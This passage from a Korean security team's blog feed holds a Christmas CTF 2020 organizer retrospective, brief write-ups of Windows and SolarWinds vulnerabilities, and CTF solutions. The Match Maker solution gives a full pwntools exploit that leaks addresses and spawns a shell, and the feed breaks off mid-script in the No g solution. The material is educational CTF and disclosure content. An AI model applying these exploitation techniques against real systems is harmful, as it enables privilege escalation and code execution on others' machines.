들었습니다.</p><p>집에 돌아와서 샤워하고 누웠는데 해가 뜰 때까지 잠을 못 잤습니다. 잡생각이 많아서 일단 지쳐서 잠들고 일어나니 상위권 팀들 라업이 기대가 되더군요. <code>lock</code>이랑 <code>angrforge</code>는 모르겠고 <code>gift</code>를 어떻게 푸셨고 어떻게 느끼셨는지에 대한 생각이 정말 컸습니다.</p><p>라업을 다 보고 나서 라업을 다 뜯어고쳤습니다. 좀 더 내가 생각했던 것과 고민했던 것이 무엇인지 그리고 2021년에는 어떤 식으로 공부하면 좋을지 이번 기회에 제가 부족했던 것, 부족함을 알고 있었지만 애써 외면하던 것들에 직면하게 되어서 좋은 경험이었던 것 같습니다.</p><p>다들 미천한(?) 문제 푸시느라 고생 많으셨습니다. 재밌게 즐기셨다면 정말 좋았을 텐데…! 다들 새해 복 많이 받으세요!</p><h1 id="L0ch"><a href="#L0ch" class="headerlink" title="L0ch"></a>L0ch</h1><p>안녕하세요. L0ch입니다! CTF 문제 출제 경험이라고는 동아리 내부 CTF 밖에 없던 저에게 크리스마스 CTF 문제를 만들어야 한다는 소식을 들었을 때..</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image7.png"></p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image8.png"></p><blockquote><p>??????? 문제를 만들라구요???</p></blockquote><p>진짜 딱 저 표정이었습니다. 거짓말 아니고 진짜로요.</p><p>국방의 의무를 수행하느라 백지가 된 머리로 열심히 따라가고 있던 와중에 (대한민국 군인들 화이팅 ㅠㅠ) CTF 문제를 그것도 세 문제나 만들라니요.. 아무튼 데이터 챌린지 신청 못한 팀장 탓임 @idioth @idioth @idioth</p><p>그렇게 열심히 최근 CTF 트렌드를 찾아보고 어느 정도 틀을 잡아가기 시작했습니다.</p><p>첫 번째 문제였던 address_book 이 나오게 된 배경입니다.</p><p>때는 하루 한 줄을 쓰기 위해 떠돌아다니던 중 Chrome의 공유 포인터 관련 UAF 취약점 정보를 보게 되었죠. </p><p>거기에 영감을 받아 공유 포인터를 커스텀으로 구현해서 거기에 취약점을 만들어볼까? </p><ul><li>MS tuesday patch의 diff 패치를 바이너리에 적용해 binary diffing으로 취약점을 찾을 수 있도록 해볼까? </li></ul><p>이렇게 해서 나온 문제입니다. 물론 사람 인생이 계획대로만 될 리가 있나요 ㅎㅎ</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image9.png"></p><p>문제는 제가 윈너블 경험이 부족하다는 점이었습니다. 버그헌팅을 하면서 원데이 몇 번 분석해본 게 전부인 저에게 취약점 설계부터 익스까지 한다? 멘탈이 아주 곱게 갈릴 거라는 걸 시작부터 예감했죠.</p><p>우선 C++의 공유 포인터를 구현하려면 당연히 C++을 써야 하는데 기본적인 OOP 개념이 부족했습니다. 문제를 만들던 중 코드 리뷰를 해보니까 진짜 개판 오 분 전이었는데 더한 문제는 어떻게 고쳐야 할지를 몰랐습니다..   분석하시면서 이거 왜 이렇게 짜 놨지 하는 부분이 있었을 텐데, 다 부족한 저의 개발실력 때문입니다.. </p><p>또 하나 문제는.. </p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image10.png"></p><blockquote><p>아니 다 만들어놓고 익스가 왜 안되는데!!!!!!!!!!!!!!!!!!!!!!!!!!</p></blockquote><p>원래 익스에 포함되는 과정 중 하나였던 <code>flag.txt</code> 파일 open을 함수가 계속 <code>응 파일 못 열었어 ㅋㅋ</code> 를 뱉는데 이게 무슨 경우지? 왜 파일을 못 여는 거지?? 혼잣말하면서 욕도 해보고 달래도 보고 열심히 삽질을 했지만 원인을 찾지 못해 결국 바이너리 내부에서 <code>flag.txt</code> 를 open만 하고 익스 과정 중 ROP 체인에서 open 과정을 빼고 file descriptor를 이용해 flag를 출력하는 것으로 타협을 볼 수밖에 없었습니다.</p><blockquote><p>후일담<br>idioth : ㅋㅋㅋㅋ 너 address book 익스 할 때 진짜 무서웠던 거 아냐<br>본인 : ??? 왜요 나 왜<br>idioth : 누구 하나 걸리면 진짜 죽는단 표정이었어<br>Fabu1ous : ㅇㅈ<br>본인 :</p></blockquote><p>취약점을 찾기 어렵게 만든 이유가 diff patch를 이용한 binary diffing으로 취약점을 찾을 수 있도록 의도한 거지만.. 계획에 차질이 생겨 diff patch도 적용을 못해 결과적으로 좋지 않은 퀄리티의 아쉬운 문제라고 생각합니다… </p><p>그렇게 한 문제를 마무리하고 보니,  왜 시작도 안 한 두 문제가 남아있고 저는 기말고사를 눈앞에 두고 있는 걸까요?</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image11.png"></p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image12.png"></p><blockquote><p>저는 그렇게.. 학점을 놓아주었습니다</p></blockquote><p>학점을 포기한 대가로 나머지 baby_RudOlPh와 picky_eater를 구상할 수 있었습니다. <em><del>등가교환의 법칙</del></em></p><p>picky_eater는 idioth 팀장님의 아이디어를 쏙 빼왔습니다. address book과 고군분투하고있던 저를 불쌍하게 봤었나봐요. “이거 네가 할래?” 라며 snake 게임 컨셉의 아이디어를 주더라고요. 그 정도로 불쌍해 보였나?;; 아무튼 감사합니다 ㅎㅎ<br>그래도 만들 땐 재밌게 만들었던 문제인 것 같습니다!</p><p>마지막 baby_RudOlPh는 두 줄로 설명하겠습니다. </p><blockquote><p>??? : (회의 도중) 님들 생각해보니까 뉴비용 포너블 문제가 없는데요?</p></blockquote><p>그래서 만들게 된 ARM(AArch64) ROP 문제입니다. 그냥 내면 재미없잖아요! 그래서 ARM을 끼얹었죠</p><p>(사실 기간 내에 원래 생각했던 type confusion 문제를 못 만들 것 같아서 뉴비문제 냈다는 건 안 비밀)</p><p>정리하고 보니까 더 잘할 수 있었음에도 그러지 못해 아쉬운 감정이 많이 남는 대회라고 생각이 드네요. 나중에 다른 CTF에 문제를 출제할 수 있는 기회가 올진 모르겠지만 기회가 된다면 더 많이, 철저하게 준비해서 좋은 퀄리티의 문제를 만들 수 있도록 노력하겠습니다. 부족한 제 문제를 풀어주신 모든 참가자 여러분들께 감사의 말씀드립니다..!</p><h1 id="Fabu1ous"><a href="#Fabu1ous" class="headerlink" title="Fabu1ous"></a>Fabu1ous</h1><ul><li>Oil-system &amp; Match-maker</li></ul><p><img src="/2021/01/03/idioth/christmasctf2020-review/image13.png"></p><p>버그 잡는 건 정말 힘든 작업이군요. 대회 때 oil-system의 풀이 수가 20이던데 아마 모두 언인텐디드일거라 생각합니다. Match-maker도 메모리 leak 중 언인텐디드가 한 개 있었습니다. 솔직히 아주 조금 억울한 부분이 있지만 그게 무슨 의미가 있겠습니까… 이런 상황이 발생한 이유를 적어보고 성찰의 시간이나 가져봅시다.</p><ol><li><p>뱁새가 황새를 따라가면 다리가 찢어진다</p><p> 문제를 만들 때까진 몰랐는데 지금 보니 정말 별거 없는 문제더군요. 큰 틀만 보면 리턴 값을 조작해 <code>win()</code> 함수를 실행하는 문제들과 크게 다를 게 없습니다. 흔히 아는 만큼 보인다고 하죠. 어려운 문제를 만들겠다는 의욕은 앞섰지만 실력은 안 따라주고 결국 쓸데없이 복잡한 동작을 하는 문제가 탄생한 거 같습니다.</p></li><li><p>돌다리도 두들겨 보고 건너라.</p><p> 최종 검사하세요. 두 번 하세요. 최종 검사의 검사도 하세요. 이번 사건 이후로 어떤 일이든 쉽게 확신을 갖진 않을 것 같습니다.</p></li></ol><ul><li>No g</li></ul><p>설문 조사에 의하면 이번 대회에서 호불호가 가장 심했던 문제네요. 셜록홈즈 암호( 춤추는 사람 그림 암호 )와 비슷한 느낌으로 crypto와 misc 그 사이 어딘가의 문제를 만들려고 해 봤습니다. No g라는 제목에서 힌트를 얻어 쉽게 푸신 분들도 있지만 그러지 못하고 기상천외한 삽질을 하신 분들도 있더군요. 가볍게 misc나 풀면서 머리 식히려고 봤다가 고통받으신 분들께 사죄하겠습니다. ㅎㅎ</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image14.png"></p><p>죄송해요 ㅠㅠㅠㅠㅠ</p><p>2년 연속 Christmas CTF에 대해 안 좋은 기억만 남네요. 올해는 꼭 여친 사귀어서 Christmas CTF 말고 데이트하러 가야겠습니다. </p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image15.png"></p><p><del>아이씨… 누가 여기다 양파를 가져다 놓은 거야!?</del></p>]]></content>
    
    
    <categories>
      
      <category>Daily-Life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>christmas ctf 2020</tag>
      
      <tag>L0ch</tag>
      
      <tag>review</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-10148: SolarWinds Orion API auth bypass to RCE</title>
    <link href="/2021/01/02/fabu1ous/2021-01-02/"/>
    <url>/2021/01/02/fabu1ous/2021-01-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-10148">CVE-2020-10148</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2019.4 HF 6 이전 버전</li><li>2020.2.1 HF 2 이전 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SolarWinds Orion platform에서 API 인증 우회를 통한 원격 코드 실행 취약점이 패치되었습니다. FireEye가 작년 12월 공개한 Sunburst backdoor로 인해 SolarWinds Orion platform은 큰 이슈가 되었습니다. 그 후 SolarWinds Orion platform에 대한 깊은 분석이 진행되면서 발견된 취약점 중 하나가 CVE-2020-10148입니다.</p><p>SolarWinds Orion platform은 시스템 모니터링 및 관리 목적으로 만들어진 infrastructure입니다. 사용자는 Orion Website를 통해 서버에 설치된 Orion에 접근해 서버를 관리할 수 있으며 SolarWinds Orion API를 요청해 SolarWinds Orion platform을 사용할 수 있습니다.</p><p>URI를 통해 Orion 서버에 요청을 보낼 때 <code>Request.PathInfo</code> 파라미터에 <code>WebResource.adx</code>, <code>ScriptResource.adx</code>, <code>i18n.ashx</code>, <code>Skipi18n</code>등의 값을 지정하면 SolarWinds가 <a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.httpcontext.skipauthorization?view=netframework-4.8">SkipAuthorization</a> flag를 설정합니다. 이로 인해 해커가 인증 절차를 건너뛰고 API 커멘드를 실행할 수 있게 됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>authentication bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17057 : Microsoft Windows Uninitialized Pointer EoP</title>
    <link href="/2021/01/01/l0ch/2021-01-01/"/>
    <url>/2021/01/01/l0ch/2021-01-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17057%20detail%20and%20exploit.html">CVE-2020-17057 Microsoft Windows DirectComposition Uninitialized Pointer Privilege Escalation Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Microsoft Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft가 2년 전에 발견한 취약점을 패치함으로써 취약점의 세부 정보가 공개되었습니다. 해당 취약점은 Windows 커널 모드의 그래픽 구성 요소인 <code>DirectComposition</code> 에서 발생하는 초기화되지 않은 pool 메모리 참조입니다.</p><p><code>DirectComposition</code> 은 리소스 생성/해제/속성 설정 등의 작업을 수행하는 <code>NtDCompositionProcessChannelBatchBuffer</code> syscall을 사용합니다.</p><p><code>DirectComposition::CInteractionTrackerMarshaler::SetBufferProperty</code> 에서는 한 쌍의 리소스 객체를 처리합니다. 첫 번째 리소스 객체가 초기화되고 두 번째 리소스 객체 타입이 <code>0x57</code>이 아니라면 두 번째 리소스 객체가 초기화되지 않습니다.</p><p>이후 <code>DirectComposition::CInteractionTrackerMarshaler::ReleaseManipulationReferences</code> 에서 할당된 한 쌍의 리소스 객체를 해제하기 위해 별도의 검증 없이<code>DirectComposition::CApplicationChannel::ReleaseResource</code> 을 호출하는데, 이때 초기화되지 않은 두 번째 리소스 객체 포인터를 참조하게 되어 커널 크래시가 발생합니다.</p><p>이를 악용하면 리소스 객체 포인터 테이블을 spray 해 임의 객체를 해제하는 등 해제된 메모리를 조작할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>uninitialized pointer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-0986: Windows splWOW64 Elevation of Privilege</title>
    <link href="/2020/12/31/idioth/2020-12-31/"/>
    <url>/2020/12/31/idioth/2020-12-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2096">Issue 2096: Windows: splWOW64 Elevation of Privilege</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 2004 (19041.508)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>5월에 Kaspersky는 Windows splWOW64의 Elevation of Privilege가 악용되고 있음을 발견했습니다. Microsoft에서 6월에 패치를 발표했지만 해당 취약점은 수정되지 않았습니다.</p><p>CVE-2020-0986은 GDI Print/Print Spooler API의 arbitrary pointer 역참조 취약점입니다. 이 취약점을 이용하여 low integrity 프로세스는 splwow64.exe(medium integrity)에 LPC 메시지를 보내 splwow64의 메모리 영역에 쓰기 권한을 얻을 수 있습니다. </p><p>splWOW64는 <code>GdiPrinterThunk</code>로 LPC 메시지를 전달합니다. <code>GdiPrinterThunk</code>의 <code>INDEX_DocumnetEvent</code>에 해당 취약점이 포함되어 있습니다. <code>INDEX_DocumentEvent</code>의 핸들러는 printer command(LPC 클라이언트를 통해 조작 가능)를 통해 유효한 핸들을 가진 프린터의 명령인지 확인합니다.</p><p>확인하고 나면 <code>DecodePointer</code> 함수를 사용하여 <code>fpDocumnetEvent</code>의 전역 변수에 저장된 함수의 포인터를 decode 한 후 decode 된 포인터를 통해 함수를 실행하고 <code>memcpy</code>를 호출합니다. 해커는 <code>memcpy</code>를 통해 복사되는 내용과 바이트 수, destination을 제어할 수 있습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>POC: <a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=468393&amp;signed_aid=nGwe__E2zFBLc_iqlJ8lVQ==">https://bugs.chromium.org/p/project-zero/issues/attachment?aid=468393&amp;signed_aid=nGwe__E2zFBLc_iqlJ8lVQ==</a></p><p><a href="https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/">https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>idioth</tag>
      
      <tag>splwow64</tag>
      
      <tag>arbitrary pointer dereference</tag>
      
      <tag>lpc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows Installer EoP 6th patch bypass</title>
    <link href="/2020/12/30/fabu1ous/2020-12-30/"/>
    <url>/2020/12/30/fabu1ous/2020-12-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://halove23.blogspot.com/2020/12/oh-so-you-have-antivirus-nameevery-bug.html">Disclosing about 8 0-day vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows installer</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="https://hackyboiz.github.io/2020/10/21/fabu1ous/2020-10-21/">CVE-2020-16902</a>에 대한 패치 우회가 공개되었습니다. CVE-2019-1415로 처음 제보된 Windows Installer EoP 취약점의 6번째 패치 우회입니다. </p><p>CVE-2020-16902의 내용은 다음과 같습니다. Windows Installer는 설치 작업 실패를 대비해 설치 작업 중 삭제되는 파일과 롤백 스크립트를<code> C:\Config.Msi</code> 디렉터리에 백업합니다. 백업 전에 <code>C:\Config.Msi</code> 디렉터리를 삭제하고 재생성하는 로직이 있는데 <code>Setsecurity()</code>의 race condition 취약점 패턴이 남아있어 악용이 가능합니다.</p><p>따라서 <code>C:\Config.Msi</code>를 삭제하고 <code>C:\Config.Msi</code>이 여전히 존재한다면(race-con 트리거 조건) <code>C:\Config.Msi</code> 대신 <code>C:\windows\install\config.msi</code>에 롤백 파일을 백업하도록 패치되었습니다. </p><p>하지만 다음과 같은 이유로 우회가 가능합니다. 만약 <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Folders\C:\Config.Msi</code> 레지스트리 키가 존재하면 그대로 <code>C:\Config.Msi</code>를 백업에 사용합니다.  <code>C:\Config.Msi</code>를 삭제한 후 <code>C:\Config.Msi</code>의 삭제 여부를 한번 더 체크한 다음 <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Folders\C:\Config.Msi</code> 레지스트리 키를 삭제합니다.  <code>C:\Config.Msi</code>가 삭제된 직후 <code>C:\Config.Msi</code>를 생성하면 레지스트리 키가 삭제되지 않습니다. Windows Installer는 <code>C:\Config.Msi</code>를 백업에 사용하게 되고 이전 취약점들을 그대로 악용할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>toctou</tag>
      
      <tag>race condition</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - Match Maker</title>
    <link href="/2020/12/29/fabu1ous/match-maker/"/>
    <url>/2020/12/29/fabu1ous/match-maker/</url>
    
    <content type="html"><![CDATA[<h1 id="문제-개요"><a href="#문제-개요" class="headerlink" title="문제 개요"></a>문제 개요</h1><p><img src="/2020/12/29/fabu1ous/match-maker/1.png"></p><ol><li><p>프로필을 만듭니다.</p><ul><li>이름, 나이, 성별, 취미를 입력</li><li>나이 정보에 따라 파트너 매칭 함수가 달라짐</li></ul></li><li><p>만든 프로필을 저장합니다.</p><ul><li>만들어진 프로필을 힙에 저장</li><li>성별을 구분하여 전역 배열에 힙 주소 저장.</li></ul></li><li><p>파트너 매칭을 합니다.</p></li><li><p>매칭 된 파트너의 정보를 출력합니다.</p></li><li><p>유저 리스트를 출력합니다.</p><ul><li>현재 프로필이 남자면 여자 리스트를 출력</li><li>현재 프로필이 여자면 남자 리스트를 출력</li></ul></li></ol><h1 id="풀이-요약"><a href="#풀이-요약" class="headerlink" title="풀이 요약"></a>풀이 요약</h1><p>find match 기능에서 사용할 알고리즘을 정하는 로직이 존재합니다. pref_min_age != pref_max_age이면서 pref_min_age ^ 2 == pref_max_age ^ 2 일 때 초기화되지 않은 스택의 쓰레기 값으로 rip를 조작할 수 있습니다. int-overflow를 활용하면 됩니다.</p><p>show user list 기능에서 user list를 참조할 때 sex ^1을 index로 사용합니다. 프로필 작성 시 성별 입력값에 제한이 없기 때문에 이를 이용해 바이너리 base주소와 libc base 주소를 얻을 수 있습니다.</p><h1 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h1><ul><li>int overflow → uninitialized stack</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/2.png"></p><p>프로필 생성 메뉴에서 입력받은 나이 정보를 토대로 파트너 매칭 루틴을 정하는 코드입니다. if…else가 아닌 if…if 이므로 integer overflow를 발생시켜 <code>(void*)func()</code>의 값을 스택에 있던 쓰레기 값으로 설정할 수 있습니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/3.png"></p><p>연상 혹은 연하 중 선호하는 쪽을 계산하는 루틴에서 절댓값을 사용합니다. 입력할 수 있는 나이에 최댓값 제한이 없기 때문에 int overflow를 발생시켜 스택 변수 <code>(void*)func()를</code> 초기화하는 작업을 건너뛸 수 있습니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/4.png"></p><p><code>(void*)func()</code>값에 영향을 미치는 쓰레기 값은 name을 입력받을 때 사용하던 버퍼입니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/5.png"></p><p>메인 메뉴에서 find match를 선택하면 rip가 잡히는 것을 확인할 수 있습니다.</p><ul><li>out of bound read</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/6.png"></p><p>성별은 int로 입력받습니다.</p><p>0 : 남자</p><p>1 : 여자</p><p><img src="/2020/12/29/fabu1ous/match-maker/7.png"></p><p>현재 프로필이 남자면 여자 유저 리스트를, 여자면 남자 리스트를 출력해주는 함수입니다. 0도 1도 아닌 다른 값을 성별로 입력하면 oob-read가 가능합니다. binary의 base주소, libc의 base주소를 leak 할 수 있습니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./match&#x27;</span>)<span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make</span>(<span class="hljs-params">age, name, Pmin, Pmax, sex</span>):</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;age: &#x27;</span>, age)p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>, name)p.sendlineafter(<span class="hljs-string">&#x27;min age limit for you: &#x27;</span>, Pmin)p.sendlineafter(<span class="hljs-string">&#x27;max age limit for you: &#x27;</span>, Pmax)p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, sex)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 1 : &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 2 : &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 3 : &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showL</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<span class="hljs-comment"># leak bin base</span>make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;-2&#x27;</span>)showL()p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)bin_base = leak - <span class="hljs-number">0x5008</span>log.info(hex(bin_base))<span class="hljs-comment"># leak read@libc</span>make(<span class="hljs-string">&#x27;65536&#x27;</span>, p64(bin_base+<span class="hljs-number">0x4fa0</span>)+<span class="hljs-string">b&#x27;BBBBBBBBCCCCCCCC&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)save()showL()p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)system = leak - <span class="hljs-number">0xbbd20</span>log.info(hex(system))make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh;&#x27;</span>+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">8</span>+p64(system), <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)find()p.interactive()</code></pre><pre><code class="hljs plain">[+] Opening connection to localhost on port 1234: Done[*] 0x55ad3a345000[*] 0x7f414a9ec410[*] Switching to interactive mode$ cat flagXMAS&#123;1_d0n7_w4nna_kn0w_who&#39;5_tak1ng_U_h0me&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>pwnable</tag>
      
      <tag>oob</tag>
      
      <tag>uninitialized stack</tag>
      
      <tag>integer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - No g</title>
    <link href="/2020/12/29/fabu1ous/no-g/"/>
    <url>/2020/12/29/fabu1ous/no-g/</url>
    
    <content type="html"><![CDATA[<h1 id="문제-개요"><a href="#문제-개요" class="headerlink" title="문제 개요"></a>문제 개요</h1><p><img src="/2020/12/29/fabu1ous/no-g/1.png"></p><p>음계(Scale)를 알파벳으로 나타내곤 합니다. 음이름이라고 하죠.</p><p>라(A), 시(B), 도(C), 레(D), 미(E) , 파(F), 솔(G)</p><p>16진수(HEX) 또한 알파벳을 사용해 수를 표현합니다.</p><p>10(A), 11(B), 12(C), 13(D), 14(E), 15(F)</p><p><img src="/2020/12/29/fabu1ous/no-g/hint.jpg"></p><p>악보에 그려진 음표를 알파벳으로, 그 알파벳을 hex값으로 치환하고 연결된 음표들끼리 hex값을 더해 ASCII로 변환하면 하나의 문자가 됩니다.</p><p>예 ) 라라라 → chr(0xa+0xa+0xa) → ‘\x1e’</p><p>hex에는 G가 없기 때문에 악보의 제목이 ‘No G’입니다. </p><p>제가 의도한 풀이 접근 방식은 이렇습니다.</p><ol><li>제목에서 힌트를 얻어 음이름을 찾아본다.</li><li>첫 여섯 음의 hex값을 더해봤더니 ‘X’가 나온다.</li><li>flag 형식이 ‘XMAS{}’이므로 2번 과정을 몇 번 더 반복해 본다.</li></ol><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><pre><code class="hljs python">note = [<span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span 